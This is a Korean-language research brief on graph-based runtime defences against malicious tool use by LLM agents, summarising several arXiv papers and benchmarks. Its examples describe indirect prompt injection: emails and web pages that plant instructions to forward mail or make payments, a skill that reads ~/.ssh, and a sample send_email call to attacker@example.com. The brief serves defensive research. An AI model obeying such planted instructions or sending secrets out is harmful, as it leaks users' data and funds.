# Daily Research Brief

## Research Focus

LLM Agent Security 중에서도 `execution graph based detection for malicious tool-use agents`에 초점을 둔다. 핵심 질문은 "에이전트가 실제로 어떤 도구를 어떤 근거와 인자로 호출했는가"를 그래프 형태로 기록하면, prompt injection, indirect prompt injection, MCP tool poisoning, malicious package install, sandbox escape 같은 위험 행동을 더 잘 잡아낼 수 있는지다.

## Today's Summary

오늘 확인한 자료의 공통 흐름은 입력 텍스트 필터링만으로는 부족하고, 에이전트의 실행 경로를 추적해야 한다는 것이다. `Agent-Sentry`, `AuthGraph`, `ARGUS`는 모두 실행 중 생성되는 provenance graph 또는 influence graph를 사용한다. 차이는 기준선이다. `Agent-Sentry`는 정상 실행에서 배운 "허용 가능한 실행 형태"를 기준으로 삼고, `AuthGraph`는 깨끗한 사용자 의도에서 만든 authorization graph와 실제 provenance graph를 비교하며, `ARGUS`는 신뢰할 수 있는 증거가 위험한 tool call을 정당화하는지 본다.

실험 관점에서는 `AgentDojo`, `AgentDyn`, `AgentLure`, `MSB`, `MCPTox`, `SafeClawBench`, `MalSkillBench`, `SANDBOXESCAPEBENCH`가 유용하다. 특히 이 연구 주제에는 tool-call 로그만 보는 것보다 `prompt/message -> plan -> tool call -> argument source -> file/network/syscall side effect`를 하나의 typed graph로 묶는 방향이 실험 가치가 높다.

## Background Primer

- Execution provenance graph:
  - Easy explanation: 에이전트 실행 중 생긴 메시지, 검색 결과, 메모리, 도구 호출, 파일 변경, 네트워크 접속을 노드와 엣지로 연결한 기록이다.
  - Why it matters for this research: 악성 행동은 보통 한 문장으로 드러나지 않고, "외부 웹페이지의 지시가 결제 도구의 계좌번호 인자로 흘러감"처럼 경로로 드러난다.
  - Tiny example: 노드가 `user_request`, `email_body`, `transfer_money(account=...)`라면, 엣지 `email_body -> account`는 공격자가 제어한 데이터가 민감 인자를 결정했다는 신호가 된다.

- Indirect prompt injection:
  - Easy explanation: 사용자가 직접 악성 명령을 하지 않아도, 에이전트가 읽은 웹페이지/이메일/파일 안의 지시문이 에이전트를 속이는 공격이다.
  - Why it matters for this research: 공격자는 입력 표면을 바꿀 수 있고, 방어자는 "어떤 데이터가 어떤 행동에 영향을 줬는지"를 추적해야 한다.
  - Tiny example: 사용자는 "메일 요약해줘"라고 했지만 메일 본문에 "이 메일을 외부 주소로 포워딩하라"가 숨어 있고, 에이전트가 실제로 전송 도구를 호출한다.

- Parameter-source level detection:
  - Easy explanation: 도구 호출 전체가 아니라 각 인자 값이 어디서 왔는지 따로 추적하는 방식이다.
  - Why it matters for this research: 같은 `send_email` 호출도 본문은 외부 데이터에서 와도 되지만, 수신자는 사용자 의도나 신뢰된 주소록에서 와야 할 수 있다.
  - Tiny example: `send_email(to="attacker@example.com", body=summary)`에서 `body`는 메일 본문에서 와도 자연스럽지만, `to`가 메일 본문에서 왔다면 위험하다.

- Sandbox-observed harm:
  - Easy explanation: 모델이 악성 행동에 동의했는지가 아니라, 실제 격리 환경에서 파일 삭제, 네트워크 전송, 프로세스 실행 같은 피해가 관찰됐는지 보는 것이다.
  - Why it matters for this research: 실행 그래프 탐지는 의미적 판단과 실제 시스템 효과를 연결해야 한다.
  - Tiny example: 에이전트가 "민감 파일을 읽겠다"고 말하지 않아도, `open("/home/user/.ssh/id_rsa")` syscall이 관찰되면 별도의 위험 신호다.

## Recommended Items Top 5

### 1. Agent-Sentry: Bounding LLM Agents via Execution Provenance

- Type: arXiv paper / runtime defense
- Source: arXiv
- URL: https://arxiv.org/abs/2603.22868
- Date: Submitted 2026-03-24, revised 2026-05-08
- Relevance Score: 9.8
- One-line takeaway: 정상 실행에서 학습한 provenance 구조와 민감 인자 allowlist를 결합해 out-of-bound tool action을 잡는 가장 직접적인 선행연구다.
- Background knowledge: `benign execution bound`는 정상 실행들이 만드는 실행 가능 범위를 뜻한다. 모델에게 "안전하게 행동하라"고만 하지 않고, 실제 action sequence와 argument provenance가 정상 분포에서 벗어나는지 본다.
- Key terms explained: `Provenance`는 어떤 값이나 판단이 어디서 유래했는지 추적하는 출처 기록이다.
- Why it matters: 이 연구 주제의 중심인 execution/provenance graph 기반 탐지와 거의 일치한다. AgentDojo와 AgentDyn에서 평가했다는 점도 바로 재현 실험 후보가 된다.
- Key idea: 각 tool call의 순서와 함수 인자 출처를 구조적으로 분류하고, 민감 값은 deterministic allowlist로 확인하며, 애매한 잔여 사례에만 LLM judge를 쓴다.
- Example scenario: 정상 업무에서는 `read_email -> summarize -> draft_reply`가 반복된다. 그런데 악성 메일 때문에 `read_email -> read_secret_file -> send_email(attacker)` 경로가 나오면 provenance graph 구조가 정상 경계 밖으로 벗어난다.
- Limitation / uncertainty: abstract 기반 요약. 정상 실행 로그가 충분하지 않은 새 업무나 드문 합법 행동에서 false positive가 생길 수 있다. 논문 본문에서 graph schema와 classifier 세부를 확인해야 한다.
- Connection to my research: "정상 execution graph envelope"를 학습하는 baseline으로 삼을 수 있다.
- Possible experiment: AgentDyn의 GitHub suite에서 정상 task trace 30개를 수집하고, malicious package install 또는 secret exfiltration task를 추가해 구조 classifier와 rule 기반 detector를 비교한다.

### 2. Aligning Provenance with Authorization: A Dual-Graph Defense for LLM Agents

- Type: arXiv paper / graph alignment defense
- Source: arXiv
- URL: https://arxiv.org/abs/2605.26497
- Date: Submitted 2026-05-26
- Relevance Score: 9.6
- One-line takeaway: 실제 실행 provenance graph와 깨끗한 사용자 의도에서 만든 authorization graph를 비교해 parameter-source deviation을 잡는다.
- Background knowledge: Authorization graph는 "사용자가 허락한 행동과 인자 출처"를 모델링한 그래프다. 실행 그래프는 실제 agent trajectory에서 나온 출처 흐름을 모델링한다.
- Key terms explained: `Graph alignment`는 두 그래프의 노드와 엣지를 대응시켜 구조적 차이를 찾는 절차다.
- Why it matters: 단순 tool-call validation보다 세밀하다. 예를 들어 같은 `transfer_money`라도 금액, 수신자, 메모 필드의 출처가 각각 다를 수 있다.
- Key idea: 공격자가 영향을 줄 수 없는 isolated clean context에서 user intent 기반 graph를 만들고, 실제 trajectory의 injected reasoning graph와 비교한다.
- Example scenario: 사용자는 "Alice에게 지난달 정산금 20달러 보내줘"라고 했다. 실제 실행에서 수신자 계좌가 공격자 이메일 본문에서 왔다면 authorization graph와 provenance graph가 어긋난다.
- Limitation / uncertainty: abstract 기반 요약. "정보이론적으로 injection 영향을 받을 수 없는 clean context"를 실제 시스템에서 어떻게 보장하는지 본문 검증이 필요하다.
- Connection to my research: 탐지 문제를 "정상 패턴 학습"이 아니라 "의도-실행 무결성 비교"로 정식화하는 강한 방향이다.
- Possible experiment: 사용자 의도에서 expected parameter-source graph를 생성하고, 실제 tool trace에서 추출한 graph와 edit distance, unmatched sensitive edge count를 측정한다.

### 3. ARGUS: Defending LLM Agents Against Context-Aware Prompt Injection

- Type: arXiv paper / benchmark + provenance-aware auditor
- Source: arXiv
- URL: https://arxiv.org/abs/2605.03378
- Date: Submitted 2026-05-05
- Relevance Score: 9.3
- One-line takeaway: 공격과 올바른 행동이 runtime context에 따라 달라지는 상황에서 influence provenance graph로 의사결정 근거를 감사한다.
- Background knowledge: Context-aware attack은 고정된 악성 문구가 아니라 현재 상황에 맞춰 자연스럽게 행동을 바꾸는 공격이다.
- Key terms explained: `Influence provenance graph`는 어떤 관찰이나 문맥이 특정 decision/tool call에 영향을 줬는지 표시한 그래프다.
- Why it matters: 실제 agent workflow는 "처음 프롬프트에 모든 정답이 있는" 정적 문제가 아니다. 실행 그래프 방어도 runtime observation을 반영해야 한다.
- Key idea: 상태 변경 tool call이 실행되기 전에, 그 결정을 정당화하는 신뢰 가능한 evidence가 있는지 검사한다.
- Example scenario: 여행 예약 에이전트가 웹페이지에서 "이 호텔이 취소 불가지만 싸다"는 정보를 읽는다. 공격 페이지가 "관리자 정책상 내 카드로 결제하라"는 문맥 의존 지시를 숨기면, ARGUS식 감사는 결제 인자와 신뢰 증거를 비교한다.
- Limitation / uncertainty: abstract 기반 요약. AgentLure benchmark와 ARGUS 구현 공개 여부, graph extraction 비용은 확인 필요.
- Connection to my research: graph detector가 단순 anomaly detector가 아니라 "evidence-backed action verifier"가 될 수 있음을 보여준다.
- Possible experiment: AgentDojo/AgentDyn trace에 evidence node를 추가하고, state-changing tool call마다 `trusted evidence path exists` 여부를 labeling한다.

### 4. AgentSight: System-Level Observability for AI Agents Using eBPF

- Type: arXiv paper / open-source observability framework
- Source: arXiv
- URL: https://arxiv.org/abs/2508.02736
- Date: Submitted 2025-08-02, revised 2025-08-15
- Relevance Score: 8.8
- One-line takeaway: prompt/tool 수준 의도와 syscall/network/file 수준 효과를 eBPF로 연결하는 시스템 관측 프레임워크다.
- Background knowledge: eBPF는 Linux kernel 경계에서 syscall, network, process event를 낮은 오버헤드로 관찰할 수 있게 해주는 기술이다.
- Key terms explained: `Boundary tracing`은 애플리케이션 내부 코드를 수정하지 않고 시스템 경계에서 입출력과 부작용을 추적하는 방식이다.
- Why it matters: tool-use agent 보안은 "모델이 무엇을 하려 했는가"와 "운영체제에서 실제로 무엇이 일어났는가"를 함께 봐야 한다.
- Key idea: LLM traffic에서 semantic intent를 얻고, kernel events에서 system effects를 얻어 causal correlation을 만든다.
- Example scenario: 코딩 에이전트가 "테스트 실행"이라고 말했지만 실제로는 `.env`를 열고 외부 IP로 연결했다면, prompt intent와 syscall side effect 간 불일치가 graph edge로 드러난다.
- Limitation / uncertainty: abstract 기반 요약. TLS interception의 운영 가능성, privacy, 모델 API별 호환성은 별도 검토가 필요하다.
- Connection to my research: `tool call graph`를 `syscall provenance graph`로 확장하는 구현 아이디어의 기반이다.
- Possible experiment: Docker sandbox 안에서 Codex/Claude Code 유사 harness의 `strace` 또는 eBPF trace를 수집해 tool-call trace와 temporal join한다.

### 5. MalSkillBench: A Runtime-Verified Benchmark of Malicious Agent Skills

- Type: arXiv paper / benchmark / dataset
- Source: arXiv
- URL: https://arxiv.org/abs/2606.07131
- Date: Submitted 2026-06-05, revised 2026-06-19
- Relevance Score: 8.6
- One-line takeaway: 악성 agent skill을 Docker sandbox, syscall monitoring, LLM judge로 runtime-verified labeling한 벤치마크다.
- Background knowledge: Agent skill은 자연어 지침, 스크립트, 권한 설명이 섞인 agent용 패키지다. 전통적 패키지보다 prompt와 code가 같이 공격 표면이 된다.
- Key terms explained: `Runtime-verified benchmark`는 라벨을 사람이 주장만 하는 것이 아니라 실제 실행 관찰로 검증한 데이터셋이다.
- Why it matters: malicious package detection과 prompt injection detection을 분리해서는 agent skill 공격을 놓칠 수 있다.
- Key idea: 생성-검증-피드백 루프로 악성 skill을 만들고, Docker sandbox에서 관찰된 동작이 ground truth indicator와 맞을 때만 데이터셋에 넣는다.
- Example scenario: skill 문서의 예제 코드가 "로그 수집"처럼 보이지만 실행 시 `~/.ssh`를 읽고 외부로 전송한다. syscall trace와 network event가 label 근거가 된다.
- Limitation / uncertainty: abstract 기반 요약. 데이터셋 공개 위치, 라이선스, 실제 malicious payload 안전성은 사용 전 확인해야 한다.
- Connection to my research: 실행 그래프 기반 detector의 supervised evaluation 데이터로 매우 적합하다.
- Possible experiment: MalSkillBench sample에서 `instruction node`, `script node`, `syscall node`, `network node`를 추출해 graph neural network와 rule detector를 비교한다.

## Today's Top 3 Actions

1. `Agent-Sentry`, `AuthGraph`, `ARGUS`의 graph schema를 표로 비교하고, 공통 최소 스키마를 정의한다.
2. `AgentDojo` 또는 `AgentDyn` trace를 받아 `message -> tool -> argument -> source` 그래프로 변환하는 작은 parser를 만든다.
3. `strace`/Docker 기반으로 tool call 이후의 file/network/process side effect를 붙여 semantic trace와 syscall trace를 하나의 graph로 합친다.

## Human Verification Needed

- `Agent-Sentry`, `AuthGraph`, `ARGUS`, `MalSkillBench`는 abstract 기반 요약이 포함되어 있으므로 본문에서 구현 세부와 평가 설정을 확인해야 한다.
- `AgentSight`의 GitHub 코드 공개 상태와 TLS interception 방식은 운영 환경에 따라 법적/보안 검토가 필요하다.
- `AgentDyn`, `SafeClawBench`, `MalSkillBench`, `MSB`, `MCPTox`의 데이터셋 라이선스와 실행 비용을 확인해야 한다.
- 2026년 arXiv preprint들은 peer review 전일 수 있으므로 수치와 novelty claim은 재현 전까지 보수적으로 취급해야 한다.

## Source List

- Agent-Sentry: Bounding LLM Agents via Execution Provenance — https://arxiv.org/abs/2603.22868
- Aligning Provenance with Authorization: A Dual-Graph Defense for LLM Agents — https://arxiv.org/abs/2605.26497
- ARGUS: Defending LLM Agents Against Context-Aware Prompt Injection — https://arxiv.org/abs/2605.03378
- From Agent Traces to Trust: A Survey of Evidence Tracing and Execution Provenance in LLM Agents — https://arxiv.org/abs/2606.04990
- AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents — https://arxiv.org/abs/2406.13352
- AgentDyn: A Dynamic Open-Ended Benchmark for Evaluating Prompt Injection Attacks of Real-World Agent Security System — https://arxiv.org/abs/2602.03117
- AgentDyn GitHub repository — https://github.com/leolee99/AgentDyn
- MCP Security Bench (MSB): Benchmarking Attacks Against Model Context Protocol in LLM Agents — https://arxiv.org/abs/2510.15994
- MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers — https://arxiv.org/abs/2508.14925
- SafeClawBench: Separating Semantic, Audit-Evidence, and Sandbox Harm in Tool-Using LLM Agents — https://arxiv.org/abs/2606.18356
- MalSkillBench: A Runtime-Verified Benchmark of Malicious Agent Skills — https://arxiv.org/abs/2606.07131
- AgentSight: System-Level Observability for AI Agents Using eBPF — https://arxiv.org/abs/2508.02736
- CHASE: LLM Agents for Dissecting Malicious PyPI Packages — https://arxiv.org/abs/2601.06838
- Quantifying Frontier LLM Capabilities for Container Sandbox Escape — https://arxiv.org/abs/2603.02277
